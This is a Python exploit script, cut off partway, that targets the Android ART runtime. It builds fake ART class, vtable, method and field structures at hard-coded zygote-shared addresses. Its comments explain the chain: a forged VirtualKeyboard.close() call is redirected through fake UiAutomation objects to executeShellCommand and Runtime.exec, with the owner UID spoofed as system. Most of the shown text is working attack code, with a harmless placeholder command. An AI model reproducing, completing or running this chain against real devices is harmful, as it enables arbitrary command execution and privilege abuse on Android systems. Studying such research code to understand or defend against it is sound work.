import ctypes
from ctypes import Structure
from ctypes import Union
from ctypes import c_byte
from ctypes import c_uint8
from ctypes import c_uint16
from ctypes import c_uint32
from ctypes import c_uint64
from ctypes import c_int32
from ctypes import c_void_p

import pprint

from typing import List
from typing import Tuple
from typing import Dict
from typing import Callable
from enum import IntEnum

import pwn
import math

from client import PwnClient


def _get_dict(obj):
    result = {}
    for field_name, field_type in obj._fields_:
        field_value = getattr(obj, field_name)
        if issubclass(field_type, Structure) or issubclass(field_type, Union):
            field_value = _get_dict(field_value)
        result[field_name] = field_value
    return result


def roundup(val: int, multiple: int) -> int:
    return val if val % multiple == 0 else val + multiple - val % multiple


class AccessFlags(IntEnum):
    # Source: https://cs.android.com/android/platform/superproject/main/+/main:art/libdexfile/dex/modifiers.h;l=26;drc=074bb2dc367bde42b837a8de4d4e88f26c074c32
    kAccPublic =       0x0001;  # class, field, method, ic
    kAccPrivate =      0x0002;  # field, method, ic
    kAccProtected =    0x0004;  # field, method, ic
    kAccStatic =       0x0008;  # field, method, ic
    kAccFinal =        0x0010;  # class, field, method, ic
    kAccSynchronized = 0x0020;  # method (only allowed on natives)
    kAccSuper =        0x0020;  # class (not used in dex)
    kAccVolatile =     0x0040;  # field
    kAccBridge =       0x0040;  # method (1.5)
    kAccTransient =    0x0080;  # field
    kAccVarargs =      0x0080;  # method (1.5)
    kAccNative =       0x0100;  # method
    kAccInterface =    0x0200;  # class, ic
    kAccAbstract =     0x0400;  # class, method, ic
    kAccStrict =       0x0800;  # method
    kAccSynthetic =    0x1000;  # class, field, method, ic
    kAccAnnotation =   0x2000;  # class, ic (1.5)
    kAccEnum =         0x4000;  # class, field, ic (1.5)

    kAccJavaFlagsMask = 0xffff;  # bits set from Java sources (low 16)
    kAccConstructor =           0x00010000;  # method (dex only) <(cl)init>
    kAccDeclaredSynchronized =  0x00020000;  # method (dex only)
    kAccClassIsProxy =          0x00040000;  # class  (dex only)
    # Set to indicate that the ArtMethod is obsolete and has a different DexCache + DexFile from its
    # declaring class. This flag may only be applied to methods.
    kAccObsoleteMethod =        0x00040000;  # method (runtime)
    # Used by a method to denote that its execution does not need to go through slow path interpreter.
    kAccSkipAccessChecks =      0x00080000;  # method (runtime, not native)
    kAccSkipHiddenapiChecks =   0x00100000;  # class (runtime)
    # Used by a class to denote that this class and any objects with this as a
    # declaring-class/super-class are to be considered obsolete, meaning they should not be used by.
    kAccObsoleteObject =        0x00200000;  # class (runtime)
    # Set during boot image compilation to indicate that the class is
    # not initialized at compile tile and not in the list of preloaded classes.
    kAccInBootImageAndNotInPreloadedClasses = 0x00400000;  # class (runtime)
    # This is set by the class linker during LinkInterfaceMethods. It is used by a method
    # to represent that it was copied from its declaring class into another class.
    # We need copies of the original method because the method may end up in different
    # places in classes vtables, and the vtable index is set in ArtMethod.method_index.
    #  
    # Default methods copied to a sub-interface or a concrete class shall have this bit set.
    # Default conflict methods shall be marked as copied, abstract and default.
    # Miranda methods shall be marked as copied and abstract but not default.
    #  
    # We do not have intrinsics for any default methods and therefore intrinsics are never
    # copied. We can therefore use a flag from the intrinsic flags range.
    kAccCopied =                0x01000000;  # method (runtime)
    kAccDefault =               0x00400000;  # method (runtime)
    # Native method flags are set when linking the methods based on the presence of the
    # @dalvik.annotation.optimization.{Fast,Critical}Native annotations with build visibility.
    # Reuse the values of kAccSkipAccessChecks and kAccMiranda which are not used for native methods.
    kAccFastNative =            0x00080000;  # method (runtime; native only)
    kAccCriticalNative =        0x00100000;  # method (runtime; native only)

    # Set by the JIT when clearing profiling infos to denote that a method was previously warm.
    kAccPreviouslyWarm =        0x00800000;  # method (runtime)

    # Set by the verifier for a method we do not want the compiler to compile.
    kAccCompileDontBother =     0x02000000;  # method (runtime)

    # Used in conjunction with kAccCompileDontBother to mark the method as pre compiled
    # by the JIT compiler. We are reusing the value of the kAccPreviouslyWarm flag which
    # is meaningless for other methods with kAccCompileDontBother as we do not collect
    # samples for such methods.
    kAccPreCompiled =           0x00800000;  # method (runtime)

    # Set by the verifier for a method that could not be verified to follow structured locking.
    kAccMustCountLocks =        0x04000000;  # method (runtime)

    # Set by the class linker for a method that has only one implementation for a
    # virtual call.
    kAccSingleImplementation =  0x08000000;  # method (runtime)

    # Whether nterp can take a fast path when entering this method (runtime; non-native)
    kAccNterpEntryPointFastPathFlag = 0x00100000;
    # Set by the class linker to mark that a method does not have floating points
    # or longs in its shorty. On RISC-V 64, a method that has only reference args.
    kAccNterpInvokeFastPathFlag     = 0x00200000;  # method (runtime)

    kAccPublicApi =             0x10000000;  # field, method
    kAccCorePlatformApi =       0x20000000;  # field, method

    # For methods which we'd like to share memory between zygote and apps.
    # Uses an intrinsic bit but that's OK as intrinsics are always in the boot image.
    kAccMemorySharedMethod =       0x40000000;

    # Set by the compiler driver when compiling boot classes with instrinsic methods.
    kAccIntrinsic  =            0x80000000;  # method (runtime)

    # Special runtime-only flags.
    # Interface and all its super-interfaces with default methods have been recursively initialized.
    kAccRecursivelyInitialized    = 0x20000000;
    # Interface declares some default method.
    kAccHasDefaultMethod          = 0x40000000;
    # class/ancestor overrides finalize()
    kAccClassIsFinalizable        = 0x80000000;


class ClassStatus(IntEnum):
    kNotReady = 0  # Zero-initialized Class object starts in this state.
    kRetired = 1  # Retired, should not be used. Use the newly cloned one instead.
    kErrorResolved = 2
    kErrorUnresolved = 3
    kIdx = 4  # Loaded, DEX idx in super_class_type_idx_ and interfaces_type_idx_.
    kLoaded = 5  # DEX idx values resolved.
    kResolving = 6  # Just cloned from temporary class object.
    kResolved = 7  # Part of linking.
    kVerifying = 8  # In the process of being verified.
    kRetryVerificationAtRuntime = 9  # Compile time verification failed, retry at runtime.
    kVerifiedNeedsAccessChecks = 10  # Compile time verification only failed for access checks.
    kVerified = 11  # Logically part of linking; done pre-init.
    kSuperclassValidated = 12  # Superclass validation part of init done.
    kInitializing = 13  # Class init in progress.
    kInitialized = 14  # Ready to go.
    kVisiblyInitialized = 15  # Initialized and visible to all threads.
    kLast = kVisiblyInitialized


class Class(Structure):
    _fields_ = [
        ('declaring_class_', c_uint32),
        ('monitor_', c_uint32),
        ('class_loader_', c_uint32),
        ('component_type_', c_uint32),
        ('dex_cache_', c_uint32),
        ('ext_data_', c_uint32),
        ('iftable_', c_uint32),
        ('name_', c_uint32),
        ('super_class_', c_uint32),
        ('vtable_', c_uint32),
        ('ifields_', c_uint64),
        ('methods_', c_uint64),
        ('sfields_', c_uint64),
        ('access_flags_', c_uint32),
        ('class_flags_', c_uint32),
        ('class_size_', c_uint32),
        ('clinit_thread_id_', c_int32),
        ('dex_class_def_idx_', c_int32),
        ('dex_type_idx_', c_int32),
        ('num_reference_instance_fields_', c_uint32),
        ('num_reference_static_fields_', c_uint32),
        ('object_size_', c_uint32),
        ('object_size_alloc_fast_path_', c_uint32),
        ('primitive_types_', c_uint32),
        ('reference_instance_offsets_', c_uint32),
        ('status_', c_uint32),
        ('copied_methods_offset_', c_uint16),
        ('virtual_methods_offset_', c_uint16)
    ]

    def __init__(self) -> None:
        self.declaring_class_ = 0
        self.monitor_ = 0
        self.virtual_methods_offset_ = 0
        self.copied_methods_offset_ = 0
        self.status_ = 0
        self.reference_instance_offsets_ = 0
        self.primitive_types_ = 0
        self.object_size_alloc_fast_path_ = 0
        self.object_size_ = 0
        self.num_reference_static_fields_ = 0
        self.num_reference_instance_fields_ = 0
        self.dex_type_idx_ = 0
        self.dex_class_def_idx_ = 0
        self.clinit_thread_id_ = 0
        self.class_size_ = 0
        self.class_flags_ = 0
        self.access_flags_ = 0
        self.sfields_ = 0
        self.methods_ = 0
        self.ifields_ = 0
        self.vtable_ = 0
        self.super_class_ = 0
        self.name_ = 0
        self.iftable_ = 0
        self.ext_data_ = 0
        self.dex_cache_ = 0
        self.component_type_ = 0
        self.class_loader_ = 0

    def build(self) -> bytes:
        return bytes(self)

    def __str__(self) -> str:
        return pprint.pformat(_get_dict(self), indent=4)

    @classmethod
    def size(cls) -> int:
        return ctypes.sizeof(Class)

    @classmethod
    def offset_embedded_vtable_length(cls) -> int:
        return Class.size()

    @classmethod
    def offset_imt_pointer(cls) -> int:
        # Assumes 64-bit architecture, i.e. 8 - byte pointers.
        return roundup(Class.offset_embedded_vtable_length() + ctypes.sizeof(c_uint32), ctypes.sizeof(c_uint64))

    @classmethod
    def offset_embedded_vtable(cls) -> int:
        return Class.offset_imt_pointer() + ctypes.sizeof(c_uint64)


class Object(Structure):
    _fields_ = [
        ('klass_', Class),
        ('monitor_', c_uint32),
    ]

    def __str__(self) -> str:
        return pprint.pformat(_get_dict(self), indent=4)

    def size() -> int:
        return ctypes.sizeof(Object)


class ArtMethod(Structure):
    class Anon(Union):
        _fields_ = [
            ('hotness_count_', c_uint16),
            ('imt_index', c_uint16),
        ]

        def __str__(self) -> str:
            return pprint.pformat(_get_dict(self), indent=4)

    class PtrSizedFields(Structure):
        _fields_ = [
            ('data_', c_void_p),
            ('entry_point_from_quick_compiled_code_', c_void_p),
        ]

        def __str__(self) -> str:
            return pprint.pformat(_get_dict(self), indent=4)

    _fields_ = [
        ('declaring_class_', c_uint32),
        ('access_flags_', c_uint32),
        ('dex_method_index_', c_uint32),
        ('method_index_', c_uint16),
        ('anon_', Anon),
        ('ptr_sized_fields_', PtrSizedFields)
    ]

    def __init__(
            self,
            address_declaring_class: int,
            dex_method_index: int,
            method_index: int,
            address_bytecode: int,
            address_interpreter_stub: int) -> None:
        # method_index is wrt. Class::methods_ or Class::embedded_vtable_, depending on method type.

        # kAccPublic = 0x1
        # kAccSkipAccessChecks = 0x00080000 (<-- need these)
        # kAccNterpEntryPointFastPathFlag = 0x00100000
        # kAccSingleImplementation = 0x08000000
        # kAccPublicApi = 0x10000000
        self.access_flags_ = (AccessFlags.kAccPublic |
            AccessFlags.kAccSkipAccessChecks |
            AccessFlags.kAccNterpEntryPointFastPathFlag |
            AccessFlags.kAccSingleImplementation |
            AccessFlags.kAccPublicApi)

        self.declaring_class_ = address_declaring_class
        self.dex_method_index_ = dex_method_index
        self.method_index_ = method_index
        self.anon_.hotness_count_ = 0xffff # ensure != 0 to mark this method as NOT hot!
        self.ptr_sized_fields_.data_ = address_bytecode
        self.ptr_sized_fields_.entry_point_from_quick_compiled_code_ = address_interpreter_stub

    def __str__(self) -> str:
        return pprint.pformat(_get_dict(self), indent=4)

    def build(self) -> bytes:
        return bytes(self)

    def size() -> int:
        return ctypes.sizeof(ArtMethod)


class ArtField(Structure):
    _fields_ = [
        ('declaring_class_', c_uint32),
        ('access_flags_', c_uint32),
        ('field_dex_idx_', c_uint32),
        ('offset_', c_uint32),
    ]

    def __init__(self, address_declaring_class: int, offset: int, field_dex_idx: int=0) -> None:
        self.declaring_class_ = address_declaring_class
        self.offset_ = offset
        self.field_dex_idx_ = field_dex_idx
        self.access_flags_ = AccessFlags.kAccPublic

    def build(self) -> bytes:
        return bytes(self)

    def __str__(self) -> str:
        return pprint.pformat(_get_dict(self), indent=4)

    def size() -> int:
        return ctypes.sizeof(ArtField)


class IFields:
    def __init__(self, elements: List[ArtField]) -> None:

        class __IFields(Structure):
            _fields_ = [
                ('length_', c_uint32),
                ('elements_', ArtField * len(elements))
            ]

            def __init__(self) -> None:
                self.length_ = len(elements)
                for i in range(len(elements)):
                    self.elements_[i] = elements[i]

            def __str__(self) -> str:
                return pprint.pformat(_get_dict(self), indent=4)
        
        self.__ifields = __IFields()
    
    def build(self) -> bytes:
        return bytes(self.__ifields)

    def __str__(self) -> str:
        return self.__ifields.__str__()

    def size(num_elements: int) -> int:
        return ctypes.sizeof(c_uint64) + ctypes.sizeof(ArtField) * num_elements

    def length(self) -> int:
        return self.__ifields.length_


class VTable:
    def __init__(self, elements: List[int]) -> None:

        class __VTable(Structure):
            _fields_ = [
                ('length_', c_uint64),
                ('elements_', c_uint64 * len(elements))
            ]

            def __init__(self):
                self.length_ = len(elements)
                for i in range(len(elements)):
                    self.elements_[i] = elements[i]

            def __str__(self) -> str:
                return pprint.pformat(_get_dict(self), indent=4)
        
        self.__vtable = __VTable()

    def build(self) -> bytes:
        return bytes(self.__vtable)

    def __str__(self) -> str:
        return self.__vtable.__str__()

    def size(num_elements: int) -> int:
        return ctypes.sizeof(c_uint64) * (num_elements + 1)


class DynamicAddress:
    def __init__(self, base: int) -> None:
        self.__base = base
        self.__size = 0

    def address_then_increment(self, size) -> int:
        address = self.__base + self.__size
        self.__size += size
        return address


class String:
    def __init__(self, declaring_class: int, string: bytes):
        class __String(Structure):

            _fields_ = [
                ('declaring_class_', c_uint32),
                ('monitor_', c_uint32),
                ('count_', c_uint32),
                ('hash_code_', c_uint32),
                ('__data__', c_uint8 * String.get_padded_string_length(string))
            ]
        self.string = __String()
        self.string.declaring_class_ = declaring_class
        self.string.monitor_ = 0
        self.string.count_ = len(string) << 1   # uses compressed string
        self.string.hash_code_ = 0
        for i in range(len(string)):
            self.string.__data__[i] = string[i]
        count = String.get_padded_string_length(string)
        for i in range(count - len(string)):
            self.string.__data__[len(string)+i] = 0

    def build(self) -> bytes:
        return bytes(self.string)

    @classmethod
    def get_padded_string_length(cls, string: bytes) -> int:
        return math.ceil(len(string) / 8) * 8

    @classmethod
    def size(cls, data: bytes) -> int:
        return ctypes.sizeof(c_uint32) * 4 + ctypes.sizeof(c_uint8) * String.get_padded_string_length(data)


class VirtualKeyboard(Structure):
    _fields_ = [
        ('declaring_class_', c_uint32),
        ('monitor_', c_uint32),
        ('mToken', c_uint32),
        ('mVirtualDevice', c_uint32),
        ('mConfig', c_uint32),
    ]

    def __init__(self, declaring_class: int, mVirtualDevice: int, mToken: int, mConfig: int=0):
        self.declaring_class_ = declaring_class
        self.monitor_ = 0
        self.mVirtualDevice = mVirtualDevice
        self.mToken = mToken
        self.mConfig = mConfig

    def build(self) -> bytes:
        return bytes(self)

    @classmethod
    def size(cls) -> int:
        return ctypes.sizeof(VirtualKeyboard)

    @classmethod
    def token_offset(cls) -> int:
        return 0x8  # MAY CHANGE: Not expected to change though, because there is a fixed field order
    
    @classmethod
    def virtual_device_offset(cls) -> int:
        return 0xc  # MAY CHANGE


class UIAutomation(Structure):
    _fields_ = [
        ('declaring_class_', c_uint32),
        ('monitor_', c_uint32),
        ('__dummy__0', c_uint8 * (0x20 - 2 * 0x4)),
        ('mUiAutomationConnection', c_uint32),
    ]

    def __init__(self, declaring_class_: int, mUiAutomationConnection: int):
        self.declaring_class_ = declaring_class_
        self.mUiAutomationConnection = mUiAutomationConnection

    def build(self) -> bytes:
        return bytes(self)

    @classmethod
    def size(cls) -> int:
        return ctypes.sizeof(UIAutomation)

    @classmethod
    def ui_automation_connection_offset(cls) -> int:
        return 0x20 # MAY CHANGE


class UIAutomationConnection(Structure):
    _fields_ = [
        # Offset 0x0
        ('declaring_class_', c_uint32),
        ('monitor_', c_uint32),
        # Offset 0x8
        ('__dummy__0', c_uint8 * 0x20),
        # Offset 0x28
        ('mClient', c_uint32),
        ('mLock', c_uint32),
        # Offset 0x30
        ('__dummy__1', c_uint8 * 0x10),
        # Offset 0x40 = 0x2c + 0x4 + 0x10
        ('mOwningUid', c_uint32),
        ('mIsShutdown', c_uint32),
    ]

    def __init__(self, declaring_class_: int, mClient: int, mOwningUid: int, mIsShutdown: int, mLock: int):
        self.declaring_class_ = declaring_class_
        self.mClient = mClient
        self.mOwningUid = mOwningUid
        self.mIsShutdown = mIsShutdown
        self.mLock = mLock
        self.monitor_ = 0

    def build(self) -> bytes:
        return bytes(self)

    @classmethod
    def size(cls) -> int:
        return ctypes.sizeof(UIAutomationConnection)

    @classmethod
    def is_shutdown_offset(cls) -> int:
        return 0x44 # MAY CHANGE

    @classmethod
    def client_offset(cls) -> int:
        return 0x28 # MAY CHANGE

    @classmethod
    def owning_uid_offset(cls) -> int:
        return 0x40 # MAY CHANGE

    @classmethod
    def lock_offset(cls) -> int:
        return 0x2c # MAY CHANGE


def main():
    # Idea: Use existing Java code to trigger command execution using attacker - controlled objects.
    # For simplicity, we use an initial object to guarantee chain execution. However, it may be possible
    # to find global (i.e. cross - process) objects that are used by the chain and the chain is executed
    # eventually.

    # 1. Initial object uses artificial class to redirect bytecode execution to a function that triggers chain execution.
    # Initial gadget:
    # [Index = 0xe8da, Offset = 0x4e85a8, Num Regs = 0x3]: public void android/hardware/input/VirtualKeyboard::close()
    # 0000: 54 20 ef 8b       IGET_OBJECT v0, v2, FIELD:Landroid/hardware/input/VirtualKeyboard;->mVirtualDevice:Landroid/companion/virtual/IVirtualDevice;
    # 0004: 54 21 ee 8b       IGET_OBJECT v1, v2, FIELD:Landroid/hardware/input/VirtualKeyboard;->mToken:Landroid/os/IBinder;
    # 0008: 72 20 11 61 10 00 INVOKE_INTERFACE {v0, v1}, METHOD:Landroid/companion/virtual/IVirtualDevice;->unregisterInputDevice(Landroid/os/IBinder;)V
    # 000e: 00 00             NOP 
    # 0010: 0e 00             RETURN_VOID 
    # 0012: 0d 00             MOVE_EXCEPTION v0
    # 0014: 6e 10 3e f1 00 00 INVOKE_VIRTUAL {v0}, METHOD:Landroid/os/RemoteException;->rethrowFromSystemServer()Ljava/lang/RuntimeException;
    # 001a: 0c 01             MOVE_RESULT_OBJECT v1
    # 001c: 27 01             THROW v1
    # which translates to the following Java code:
    # @Override
    # @RequiresPermission(android.Manifest.permission.CREATE_VIRTUAL_DEVICE)
    # public void close() {
    #     try {
    #         mVirtualDevice.unregisterInputDevice(mToken);
    #     } catch (RemoteException e) {
    #         throw e.rethrowFromSystemServer();
    #     }
    # }

    # Plan:
    # 1. Construct fake String object `command`.
    # 2. Construct fake UIAutomation object `ui`.
    # 3. Construct fake VirtualKeyboard object `initial`.
    # Ensure that 
    # - `initial.mToken = command`
    # - `initial.mVirtualDevice = ui`
    # - imt of `initial` contains only references to `executeShellCommand`

    # Why not directly invoke Runtime.getRuntime().exec(command)?
    # The problem is that finding `Runtime.getRuntime()` is not consistent over multiple app restarts in general.
    # This means we either need to construct a `Runtime` object or find a method
    # that calls the above `Runtime.getRuntime()` and eventually invokes `exec(command)`.
    # Another issue is with passing parameter `command`. In order to pass an argument,
    # taking into account the ability to inject objects, `command` should be taken from
    # an object field. This is where the initial object comes into play.
    # `initial` provides a method that uses `mVirtualDevice` to invoke an interface method, which
    # means that method resolution will respect the imt of the class of `mVirtualDevice`. This
    # must be set by an attacker to call into `UIAutomation::executeShellCommand`. Notice that
    # this internally invokes `mUiAutomationConnection.executeShellCommand(command, sink, null)`. This
    # means that it internally invokes `UIAutomationConnection::executeShellCommandWithStderr`. Again,
    # this invokes `Runtime.getRuntime().exec(command)` close to the beginning. This means that
    # we only need to set fields of `initial.mVirtualDevice.mUiAutomationConnection` to make it
    # to the command execution line. This mainly involves setting some flags like
    # `mIsShutdown = false`, `mClient != null` and `mOwningUid = Process.SYSTEM_UID = 0x1000`.

    # Configurable constants
    # We cannot predict the class of the initial object and thus
    # not what interfaces the class implements. Luckily, Map::get() is a
    # frequently used method and thus almost guaranteed to be in the DexCache.
    # Thus, method resolution is not expected to take the (very) slow path.

    # NOTE: CHANGE ME refers to addresses that are shared due to Android's
    # fork server architecture. Hence, even a local, unprivileged app always
    # knows these addresses!

    # Address of "[anon:dalvik-/system/framework/boot-framework.art]" (32-bit address)
    address_boot_framework_art = 0x0000006fe6f000 # TODO: CHANGE ME

    # Lowest address of "/system/framework/framework.jar"
    address_framework_jar = 0x00007a34a3d000 # TODO: CHANGE ME

    # Address of the DexCache instance managing "/system/framework/framework.jar@classes.dex"
    address_dex_cache = address_boot_framework_art + 0x3abc8

    # Address of libart.so
    address_libart = 0x00007a37400000 # TODO: CHANGE ME

    # Address of "ExecuteNterpImpl"
    address_interpreter_stub = address_libart + 0x200090

    # Address of "/system/framework/boot.art" (32-bit address)
    address_boot_art = 0x0000006f6d7000 # TODO: CHANGE ME

    # Buffer address to store fake objects and classes to.
    # This is a [anon:.bss] (32-bit address)
    address_buffer = 0x000000718c4000 # TODO: CHANGE ME

    # Used MemoryAccessMonitor of Frida to identify accessed objects.
    address_target_object = address_boot_art + 0x215f0

    # Dex cache allocated in Zygote
    address_dex_cache = address_boot_framework_art + 0x3abc8

    # String class
    address_string_class = address_boot_art + 0x61f78

    # Address of bytecode of UiAutomation::executeShellCommand(String)
    # Seems to be the same 64-bit address among different apps (poc_local, youtube, chrome)
    UIAutomation_method_executeShellCommand_address = address_framework_jar + 0x1cd11c4

    # ArtMethod of android.hardware.input.VirtualKeyboard::close()
    VirtualKeyboard_method_close_address = address_framework_jar + 0x1f5b710

    # UiAutomationConnection::executeShellCommand method address
    UIAutomationConnection_method_executeShellCommand_address = address_framework_jar + 0x1cd0a80
    UIAutomationConnection_method_executeShellCommandStderr_address = address_framework_jar + 0x1cd0a9c

    # FOR DEBUGGING: LanguageTag LanguageTag::parse(String, ParseStatus)+200
    # address_boot_oat = 0x000000709d1000
    # address_laguagetag_parse = address_boot_oat + 0x1520a0
    # print(f'DEBUG: Please break on {hex(address_laguagetag_parse)}')

    # Predefine memory layout, because of circular object dependencies.
    dyn_address = DynamicAddress(address_buffer)
    def address_then_increment(current_object_size: int) -> int:
        return dyn_address.address_then_increment(current_object_size)

    def address_to_offset(address: int) -> int:
        return address - address_buffer

    address_map = {
        # Format: string -> address
        'dex_cache': address_dex_cache,
        'interpreter_stub': address_interpreter_stub,

        'String_class': address_string_class
    }

    def update(other):
        for key in other:
            if key in address_map:
                raise KeyError(f'Key {key} already exists.')
        address_map.update(other)
    

    # Required data
    command_string = b'log "HELLO"'
    
    # Constants
    # Allocating 64 entries + first entry, because IVirtualDevice has a lot of methods.
    # We let vtables and IMTs overlap!
    VirtualKeyboard_vtable_size = 0x21
    UIAutomation_vtable_size = 0x41

    VirtualKeyboard_ifields_size = 0x2
    UIAutomation_ifields_size = 0x1
    UIAutomationConnection_ifields_size = 0x4
    UIAutomationConnection_vtable_size = 0x1 + 0x30
    UIAutomationConnection_vtable_index_executeShellCommandStderr = 0x2a

    # Setup payload layout using address_map
    # Build initial class and object
    update({
        'VirtualKeyboard_class': address_then_increment(Class.size() + VTable.size(VirtualKeyboard_vtable_size))
    })
    update({
        'VirtualKeyboard_vtable': address_map['VirtualKeyboard_class'] + Class.size()
    })

    update({
        'VirtualKeyboard_ifields': address_then_increment(IFields.size(VirtualKeyboard_ifields_size))
    })

    update({
        'VirtualKeyboard_method_close': address_then_increment(ArtMethod.size())
    })

    # Build command string object (String class should reside in OldSpace, so no need to create fake class)
    update({
        'String_object': address_then_increment(String.size(command_string))
    })

    # Build UiAutomation class and object, which allows calling executeShellCommand
    update({
        'UIAutomation_class': address_then_increment(Class.size() + VTable.size(UIAutomation_vtable_size))
    })
    update({
        'UIAutomation_vtable': address_map['UIAutomation_class'] + Class.size()
    })

    update({
        'UIAutomation_ifields': address_then_increment(IFields.size(UIAutomation_ifields_size))
    })
    
    update({
        'UIAutomation_method_executeShellCommand': address_then_increment(ArtMethod.size())
    })

    update({
        'UIAutomation_object': address_then_increment(UIAutomation.size())
    })

    # Build UiAutomationConnection class and object
    update({
        'UIAutomationConnection_class': address_then_increment(Class.size() + VTable.size(UIAutomationConnection_vtable_size))
    })
    update({
        'UIAutomationConnection_vtable': address_map['UIAutomationConnection_class'] + Class.size()
    })

    update({
        'UIAutomationConnection_ifields': address_then_increment(IFields.size(UIAutomationConnection_ifields_size))
    })
    
    update({
        'UIAutomationConnection_method_executeShellCommand': address_then_increment(ArtMethod.size())
    })
    
    update({
        'UIAutomationConnection_method_executeShellCommandStderr': address_then_increment(ArtMethod.size())
    })

    update({
        'UIAutomationConnection_object': address_then_increment(UIAutomationConnection.size())
    })


    payload_layout = {}


    # Build VirtualKeyboard components. "Weird constants" come from trying to build
    # objects and classes as realistic as possible by copying field values seen in the debugger.

    # 1. Build VirtualKeyboard class (fake)
    VirtualKeyboard_class = Class()
    VirtualKeyboard_class.ifields_ = address_map['VirtualKeyboard_ifields']
    VirtualKeyboard_class.dex_cache_ = address_map['dex_cache']
    VirtualKeyboard_class.dex_class_def_idx_ = 0xb03
    VirtualKeyboard_class.dex_type_idx_ = 0x18cd
    VirtualKeyboard_class.num_reference_instance_fields_ = 0x2
    VirtualKeyboard_class.object_size_ = 0x10
    VirtualKeyboard_class.object_size_alloc_fast_path_ = 0x10
    VirtualKeyboard_class.primitive_types_ = 0x20000
    VirtualKeyboard_class.reference_instance_offsets_ = 0x3
    VirtualKeyboard_class.status_ = 0xf0000000
    VirtualKeyboard_class.copied_methods_offset_ = 0x3
    VirtualKeyboard_class.virtual_methods_offset_ = 0x1

    # 2. Build VirtualKeyboard ifields. Offsets must coincide with above abstraction.
    VirtualKeyboard_mToken = ArtField(
        address_declaring_class=address_map['String_class'],
        offset=VirtualKeyboard.token_offset(),
        field_dex_idx=0#0x8bee    # MAY CHANGE
    )
    VirtualKeyboard_mToken.access_flags_ = 0x12

    VirtualKeyboard_mVirtualDevice = ArtField(
        address_declaring_class=address_map['UIAutomation_class'],
        offset=VirtualKeyboard.virtual_device_offset(),
        field_dex_idx=0#0x8bef    # MAY CHANGE
    )
    VirtualKeyboard_mVirtualDevice.access_flags_ = 0x12

    VirtualKeyboard_ifields = IFields([
        VirtualKeyboard_mToken,
        VirtualKeyboard_mVirtualDevice
    ])
    assert (VirtualKeyboard_ifields.length() == VirtualKeyboard_ifields_size)

    # 3. Build VirtualKeyboard vtable
    VirtualKeyboard_vtable = VTable([
        address_map['VirtualKeyboard_vtable'] + 0x8 + 0x8 # skip length (8) and imt entry (8)
    ] + [
        address_map['VirtualKeyboard_method_close']
        for _ in range(VirtualKeyboard_vtable_size - 1)
    ])

    # 4. Build VirtualKeyboard::close ArtMethod
    VirtualKeyboard_method_close = ArtMethod(
        address_declaring_class=address_map['VirtualKeyboard_class'],
        dex_method_index=0,#0xe8da,    # MAY CHANGE
        method_index=0,#0xb,
        address_bytecode=VirtualKeyboard_method_close_address,
        address_interpreter_stub=address_interpreter_stub
    )

    # 5. Build VirtualKeyboard object that uses the fake class
    VirtualKeyboard_object = VirtualKeyboard(
        declaring_class=address_map['VirtualKeyboard_class'],
        mVirtualDevice=address_map['UIAutomation_object'],
        mToken=address_map['String_object'],
    )

    # 6. Add VirtualKeyboard components to payload layout
    payload_layout.update({
        address_to_offset(address_map['VirtualKeyboard_class']): VirtualKeyboard_class.build() + VirtualKeyboard_vtable.build(),
        address_to_offset(address_map['VirtualKeyboard_ifields']): VirtualKeyboard_ifields.build(),
        address_to_offset(address_map['VirtualKeyboard_method_close']): VirtualKeyboard_method_close.build(),
    })


    # Build the command String object

    # 1. Create command string object
    String_object = String(
        declaring_class=address_map['String_class'],
        string=command_string
    )

    # 2. Insert String object into payload.
    payload_layout.update({
        address_to_offset(address_map['String_object']): String_object.build()
    })

    # Build UIAutomation class and object, so that executeShellCommand works.

    # 1. Build UIAutomation class (fake). Mainly used for faking method resolution and field accesses.
    UIAutomation_class = Class()
    UIAutomation_class.dex_cache_ = address_map['dex_cache']
    UIAutomation_class.ifields_ = address_map['UIAutomation_ifields']
    UIAutomation_class.access_flags_ = 0x11
    UIAutomation_class.class_size_ = 0x275
    UIAutomation_class.dex_class_def_idx_ = 0x27c
    UIAutomation_class.dex_type_idx_ = 0x59f
    UIAutomation_class.num_reference_instance_fields_ = 0x7
    UIAutomation_class.num_reference_static_fields_ = 0x2
    UIAutomation_class.object_size_ = 0x3e
    UIAutomation_class.object_size_alloc_fast_path_ = 0x40
    UIAutomation_class.primitive_types_ = 0x20000
    UIAutomation_class.reference_instance_offsets_ = 0x7f
    UIAutomation_class.status_ = 0xf0000000
    UIAutomation_class.copied_methods_offset_ = 0x3e
    UIAutomation_class.virtual_methods_offset_ = 0x11


    # 2. Build ifields for UiAutomation, used for accessing mUiAutomationConnection
    UIAutomation_mUIAutomationConnection = ArtField(
        address_declaring_class=address_map['UIAutomationConnection_class'],
        offset=UIAutomation.ui_automation_connection_offset(),
        field_dex_idx=0#0x31de
    )
    UIAutomation_mUIAutomationConnection.access_flags_ = 0x12

    UIAutomation_ifields = IFields([
        UIAutomation_mUIAutomationConnection
    ])
    assert (UIAutomation_ifields.length() == UIAutomation_ifields_size)

    # 3. Create vtable for UiAutomation to redirect any interface invocation to executeShellCommand
    UIAutomation_method_executeShellCommand = ArtMethod(
        address_declaring_class=address_map['UIAutomation_class'],
        dex_method_index=0,#0x39fb,
        method_index=0,#0x16,
        address_bytecode=UIAutomation_method_executeShellCommand_address,
        address_interpreter_stub=address_interpreter_stub
    )

    UIAutomation_vtable = VTable([
        address_map['UIAutomation_vtable'] + 0x10
    ] + [
        address_map['UIAutomation_method_executeShellCommand']
        for _ in range(UIAutomation_vtable_size - 1)
    ])

    # 4. Create UIAutomation object
    UIAutomation_object = UIAutomation(
        declaring_class_=address_map['UIAutomation_class'],
        mUiAutomationConnection=address_map['UIAutomationConnection_object']
    )

    # 5. Integrate UiAutomation object into payload
    payload_layout.update({
        address_to_offset(address_map['UIAutomation_class']): UIAutomation_class.build() + UIAutomation_vtable.build(),
        address_to_offset(address_map['UIAutomation_ifields']): UIAutomation_ifields.build(),
        address_to_offset(address_map['UIAutomation_method_executeShellCommand']): UIAutomation_method_executeShellCommand.build(),
        address_to_offset(address_map['UIAutomation_object']): UIAutomation_object.build()
    })


    # Build UiAutomationConnection object

    # 1. Create class for UiAutomationConnection, because its address is unknown.
    UIAutomationConnection_class = Class()
    UIAutomationConnection_class.dex_cache_ = address_map['dex_cache']
    UIAutomationConnection_class.ifields_ = address_map['UIAutomationConnection_ifields']
    UIAutomationConnection_class.access_flags_ = 0x11
    UIAutomationConnection_class.class_size_ = 0x240
    UIAutomationConnection_class.dex_class_dex_idx = 0x180e
    UIAutomationConnection_class.dex_type_idx_ = 0x5a2
